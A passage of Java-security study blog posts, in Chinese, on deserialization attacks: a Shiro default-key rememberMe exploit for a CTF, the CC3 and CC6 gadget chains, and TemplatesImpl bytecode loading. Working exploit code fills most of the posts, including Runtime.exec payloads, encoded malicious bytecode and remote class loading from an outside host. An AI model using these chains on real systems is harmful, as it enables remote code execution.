= obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode(); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{code}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); // faketransformer防止构造时触发  Transformer faketransformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null); // CC6pro  Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, faketransformer); // key传入恶意TemplatesImpl对象  TiedMapEntry tme = new TiedMapEntry(outerMap,obj); HashMap expMap = new HashMap(); expMap.put(tme,\u0026#34;value\u0026#34;); outerMap.clear(); //将faketransformer改造，iMethodName换成newTransformer触发链子  setFieldValue(faketransformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); // 生成序列化字符串  ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // shiro数据生成  AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key); System.out.printf(ciphertext.toString()); } }   最后我们再写个类去生成字节码去给TemplatesImpl加载\n这里用到了javassist，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl\n1 2 3  ClassPool pool = ClassPool.getDefault(); CtClass clazzz = pool.get(\u0026#34;EvilTest\u0026#34;); byte[] code = clazzz.toBytecode();   然后再写一个恶意类，因为是要放入TemplatesImpl加载，所以得继承AbstractTranslet\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class EvilTest extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public EvilTest() throws IOException { super(); Runtime.getRuntime().exec(\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); } }   然后运行拿到rememberMe，换上去刷新页面拿到flag**（要把JSESSIONID删掉！！！）**\n总结 其实也没啥好说的，就是Shiro的key泄露造成的序列化数据的伪造，个人觉得Shiro太自负了，出现这种隐患不是去修改机制而还是从key的角度去防护，这让Shiro无论哪个版本，只要key泄露了，都会出现反序列化漏洞\n然后值得一说的是，Shiro他因为不允许反序列化数组的原因，误打误撞的防御了ysoserial的CC链POC，关于这个的原因，详情可以参考这篇博客\n最后我这次构造的POC其实挺曲折的，因为前面抱着侥幸的心里漏学了一些知识，导致都在这里还债了\n最后总结一下shiro的CC利用链的构建思路\n1 2 3 4 5 6 7 8 9 10 11  javassist生成恶意字节码 -\u0026gt; TemplatesImpl -\u0026gt; obj 构建faketransformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null) faketransformer -\u0026gt; LazyMap.decorate() -\u0026gt; outMap TiedMapEntry(outMap,obj) -\u0026gt; tme : 等待触发newTransformer 新建HashMap —\u0026gt; tmp -\u0026gt; expMap.put(tme,xxx) : 等待触发get进入CC6链子 把newTransformer插入iMethodName -\u0026gt; setFieldValue : faketransformer转为可用transformer，触发transform可调用newTransformer   ","date":"2022-10-03T22:30:52+08:00","permalink":"https://example.com/post/shiro1/","title":"[Java安全] Shiro反序列化CC链漏洞"},{"content":"前言 因为一些反序列化的过滤工具的原因，把CC1的InvokeTransformer等给过滤了，所以设计出CC3来绕过⼀些规则对InvokerTransformer的限制\nCC1与TemplatesImpl 前一篇文章介绍到了TemplatesImpl，那么这里就用上了，我们知道TemplatesImpl的利用链是这样的\n1 2 3 4  TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses()-\u0026gt; TransletClassLoader#defineClass()   入口点在newTransformer，那么我们可以利用TemplatesImpl，去连接上我们的CC1链子\n看完下面的例子就能懂了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.*; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CC3 { public static void main(String[] args) throws Exception { byte[] bytes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBAA5UZW1wQ2xhc3MuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABAAlUZW1wQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAABMABAAUAAwAFQABABAAAAACABE=\u0026#34;); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytes}); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;test\u0026#34;); setFieldValue(templates,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); // templates.newTransformer();  Transformer[] transformers = new Transformer[] { new ConstantTransformer(templates), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }   CC3 介绍完了CC1和TemplatesImpl，接下来就进行CC3的分析了，在ysoserial的CC3中，可以发现他用了两个新的东西，一个叫TrAXFilter，一个叫InstantiateTransformer\n先从TrAXFilter说起，他的构造方法会执行\n1  _transformer = (TransformerImpl) templates.newTransformer();   所以我们需要找到一个能执行构造方法的，这里就有个InstantiateTransformer完美解决了这个问题，他在执行transform的时候就会进行构造方法的调用\n我们构造POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CC3 { public static void main(String[] args) throws Exception { byte[] bytes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBAA5UZW1wQ2xhc3MuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABAAlUZW1wQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAALAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEAALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAABMABAAUAAwAFQABABAAAAACABE=\u0026#34;); TemplatesImpl templatesobj = new TemplatesImpl(); setFieldValue(templatesobj,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytes}); setFieldValue(templatesobj,\u0026#34;_name\u0026#34;,\u0026#34;test\u0026#34;); setFieldValue(templatesobj,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); // templates.newTransformer();  Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[] { Templates.class }, new Object[] { templatesobj } ) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }   成功加载字节码\n","date":"2022-10-03T20:47:28+08:00","permalink":"https://example.com/post/cc3/","title":"[Java安全] CommonsCollections3链分析"},{"content":"Java字节码 URLClassLoader远程加载 在前面学习classloader的时候就学习到了URLClassLoader，进行远程加载类\n比如我在远程服务器写一个这个类\n1 2 3 4 5 6 7 8 9 10 11  public class Test { public static void main(String[] args){ try{ Runtime.getRuntime().exec(\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;); } catch(Exception e) { e.printStackTrace(); } } }   然后在服务端远程加载这个类\n1 2 3 4 5 6 7 8 9 10 11 12  import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class URLClassLoaderTest { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { URL url = new URL(\u0026#34;http://101.35.98.118:12424/javatest/\u0026#34;); URLClassLoader cl = new URLClassLoader(new URL[]{url}); Class c = cl.loadClass(\u0026#34;Test\u0026#34;); c.newInstance(); } }    正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这 些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：\nURL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件\nURL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件\nURL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类\n我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是 非 file 协议的情况下，最常见的就是 http 协议。\n defineClass直接加载 加载字节码，无论是远程还是本地，最后都会到defineClass，p牛这里画了一个图非常直观\n  loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass\n  findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass\n  defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类\n  他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中\n但是要注意的是，defineClass调用的时候，类对象不会被初始化，所以如果要使用defineClass来加载类的时候，需要想办法调用构造方法\n这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得不使用反射的形式来调用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Base64; public class defineClass { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { Method defineClass = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\u0026#34;); Class hello = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Hello\u0026#34;,code,0,code.length); hello.newInstance(); } }   TemlatesImpl加载字节码 defineClass因为太底层了，一般开发是不会直接使用他的，但是不代表就没有价值了，比如这个TemlatesImpl里面就用到了defineClass，下面来分析这个利用链\n在TemplatesImpl里定义了一个TransletClassLoader，这里面最后一行重写了defineClass方法，而且没有声明定义域，那就是默认default，可以在当前类和同包里被利用\n那我们就找TemplatesImpl哪里调用了TransletClassLoader#defineClass()，找引用，发现在TemplatesImpl#defineTransletClasses()调用了，但是这个作用域是private，所以我们再找一下哪里调用了这个\n继续找引用，找到个getTransletInstance，还是private\n继续找引用，在newTransformer找到唯一的应用，而且newTransFormer是public，可以在外面被调用了\n所以链子就出来了\n1 2 3 4  TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses()-\u0026gt; TransletClassLoader#defineClass()   现在我们来构造POC，看看如何把序列化数据放进去执行defineClass，从后往前看，code作为唯一的传输传入\n往上走，首先是TransletClassLoader对象的创建，这里的第二个参数需要我们传入不然会报错，只需要创建一个对象传进去就行了\n1  private transient TransformerFactoryImpl _tfactory = null;   这里循环传入，数据来源是_bytecodes[i]，他是私有成员变量，可以控制\n但是仅有_bytecode是不行的，这里我们往上走会发现，这里要进去这个方法还有条件，我们必须保证_name不为空，否则就不会进入defineTransletClasses\n所以我们需要为TemplatesImpl设定三个值，由于是私有属性，我们需要用到反射setAccessible去设置私有成员变量\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class TemplatesImplTest { public static void main(String[] args) throws Exception { byte[] bytes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM\u0026#34;); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytes}); setFieldValue(templates,\u0026#34;_name\u0026#34;,\u0026#34;test\u0026#34;); setFieldValue(templates,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); templates.newTransformer(); } //利用反射给私有变量赋值如下  public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }   但是我们拿刚刚defineClass的序列化数据直接跑起来发现，他没有执行命令\n原因是TemplatesImpl对加载的字节码是有要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类\n所以我们需要构造一个继承了AbstractTranslet的类，在他的构造方法里去写我们要执行的代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class TempClass extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public TempClass(){ super(); System.out.println(\u0026#34;Hello TemplatesImpl\u0026#34;); } }   当然，TemplatesImpl的newTransformer的外面其实还有一层，是getOutputProperties\n而有的地方是存在getProperty方法的，对这个方法要有敏感度，他会调用JavaBean的getter方法，而getOutputProperties就是一个getter方法。利用可以参考CB1\n","date":"2022-10-03T14:39:19+08:00","permalink":"https://example.com/post/templatesimpl/","title":"[Java安全] Templatesimpl与字节码"},{"content":"前言 之前我们分析了CC1，从简化版开始学习，再到完整分析CC1，再学习了动态代理和LazyMap的利用链构造，但是都有一个缺陷就是版本限制，只能适用于8u71之前的链子，因为AnnotationInvocationHandler的readObject方法发生了改变，CC6就是为了高版本Java的利用问题\nCC6 这里我还是跟着p牛的Java安全漫谈来学习，这里p牛是简化了ysoserial的CC6利用链，gadget是这样的\n我们从后往前看，可以发现还是走了LazyMap.get()方法，在CC1中，我们是通过动态代理Map，从AnnotationInvocationHandler.readObject调用this.memberValues.entrySet()然后到AnnotationInvocationHandler.invoke()再调用到get方法\n而高版本的readObject逻辑已经修改了，不能走这条路了，观察CC6的gadget，这里走了org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()\n我们跟进TiedMapEntry去看看，执行了this.map.get(this.key)，我们实例化的时候是可以操控map和key的的\n而且他的hashCode方法又执行了this.getValue()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  public class TiedMapEntry implements Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { this.map = map; this.key = key; } // ...  public Object getValue() { return this.map.get(this.key); } // ...  public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } // ...   所以现在的目的就变成了找到哪里调用了TiedMapEntry#hashCode，看到gadget是调用了HashMap.hash()方法这其实就是接上了之前学习的URLDNS链子\n在HashMap的readObject中调用了\n1  putVal(hash(key), key, value, false, false)   跟进hash方法，调用了key.hashCode()\n1 2 3 4  static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); }   所以我们控制key为TiedMapEntry的对象即可\nPOC 首先是创建好我们的恶意Map\n1 2 3 4 5 6 7 8 9  Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34; }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain);   然后就是这次的主角TiedMapEntry登场了，我们需要他的hashCode方法，调用到他的hashCode方法的途径是HashMap的readObject里面的hash(key)\n所以我们实例化TiedMapEntry，把恶意的Map传入作为map参数，key是啥无所谓，因为要进ChainedTransformer，然后再把这个TiedMapEntry作为key传入HashMap中，这样就调用到了TiedMapEntry#hashCode()\n1 2 3  TiedMapEntry tme = new TiedMapEntry(outerMap,\u0026#34;key\u0026#34;); HashMap expMap = new HashMap(); expMap.put(tme,\u0026#34;value\u0026#34;);   注意点1 看ysoserial代码可以发现，他构造ChainedTransformer的时候，是这样的，多了一个\nnew ConstantTransformer(1)\n起初我没觉得有什么，后来到了分析CC6的链子的时候，我发现会报错\n原因是java.lang.UNIXProcess不能被序列化\n这里我调试跟进去看了一下，如果POC和之前一样的话，这里是返回UNIX对象的\n因为CC6的最后需要把恶意的代码加进一个新的Map里面去，然后再对这个Map进行序列化，所以这里就会因为UNIXProcess没有基础serializable而触发报错了\n所以我们的解决办法就是在后面再加上一个new ConstantTransformer(1)，这样返回的就是可序列化的对象了\n注意点2 链子基本就是这样了，但是有一点要注意的是，如果直接拿expMap去生成序列化数据，是不会RCE的\n原因在这，当我们进入LazyMap的get方法的时候，他这个判断条件过不去，不会进入执行factory.transform方法\n原因是在构造新的Map的时候，我们执行了一次expMap.put(tme,\u0026quot;value\u0026quot;);，把恶意数据put进Map中，在执行这个方法的时候会走进LazyMap的get方法，再插入一个数据进去，{\u0026quot;key\u0026quot;,1}\n所以当我们反序列化以后的恶意的outerMap要去执行get的时候，就会因为里面有值而过不了判断执行不了transform\n解决办法就是在expMap.put(tme,\u0026quot;value\u0026quot;);的后面去把outerMap的内容删除即可\n最后的POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.util.HashMap; import java.util.Map; public class CC6 { public static void main(String[] args) throws ClassNotFoundException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap,\u0026#34;key\u0026#34;); HashMap expMap = new HashMap(); expMap.put(tme,\u0026#34;value\u0026#34;); outerMap.remove(\u0026#34;key\u0026#34;); FileOutputStream fileInputStream = new FileOutputStream(new File(\u0026#34;./1.txt\u0026#34;)); ObjectOutputStream oos = new ObjectOutputStream(fileInputStream); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\u0026#34;./1.txt\u0026#34;))); Object o = (Object) ois.readObject(); } }   注意点3 我们在构造序列化对象的时候，由于这里执行了这个，而这个put方法里面会执行hash()，所以就会导致在序列化的时候就会把整个利用链走一遍\n1  expMap.put(tme,\u0026#34;value\u0026#34;);   这里看ysoserial有个解决办法，就是构造LazyMap的时候用一个fakeTransformers对象\n等到最后生成payload的时候再用反射，getDeclaredField，把真正的恶意transformer换进去\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6pro { public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException { Transformer[] faketransformer = new Transformer[]{new ChainedTransformer(new Transformer[]{ new ConstantTransformer(1) })}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[]{\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), new ConstantTransformer(1) }; // 传入fake防止序列化时执行  Transformer transformerChain = new ChainedTransformer(faketransformer); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap,\u0026#34;key\u0026#34;); HashMap expMap = new HashMap(); expMap.put(tme,\u0026#34;value\u0026#34;); outerMap.remove(\u0026#34;key\u0026#34;); // 到最后生成payload的时候，利用反射把真正的transform换进去  Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); // 序列化数据  FileOutputStream fileInputStream = new FileOutputStream(new File(\u0026#34;./1.txt\u0026#34;)); ObjectOutputStream oos = new ObjectOutputStream(fileInputStream); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(\u0026#34;./1.txt\u0026#34;))); Object o = (Object) ois.readObject(); } }   